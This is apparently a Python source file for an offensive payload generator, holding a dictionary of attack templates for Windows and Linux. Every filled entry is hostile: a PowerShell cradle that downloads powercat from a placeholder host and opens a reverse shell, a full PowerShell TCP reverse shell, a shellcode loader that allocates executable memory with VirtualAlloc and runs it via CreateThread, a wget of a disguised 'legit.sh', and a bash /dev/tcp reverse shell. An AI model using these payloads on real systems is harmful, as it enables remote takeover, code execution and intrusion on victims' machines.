#!/usr/bin/env python

#TODO make this into a class instead and handle length etc dynmatically, (don't hardcode everything)
#TODO remake this from scratch
library = {
    "windows/x64" : 
    {
        "ps1" : 

        {
            "download" : """IEX(New-Object System.Net.WebClient).DownloadString('http://<ipaddress>/powercat.ps1');powercat -c <ipaddress> -p <port> -e powershell""",

            "rev" : """$client = New-Object System.Net.Sockets.TCPClient('<ipaddress>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""",

            "threadi" : """
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
<shellcode>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt64()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
""",
        },

        "bat" : {},
        "vba" : {},
        "exe" : {}
     },

     "windows/x32" : {

     },

     "linux/x64" : {
         "sh" : { 
            "download" : "wget http://<ipaddress>:80/legit.sh -O legit.sh",
            "rev" : "bash -c 'bash -i >& /dev/tcp/<ipaddress>/<port> 0>&1'"
         },

         "exe" : {

         }
     },

     "linux/x32" : {

     }
}

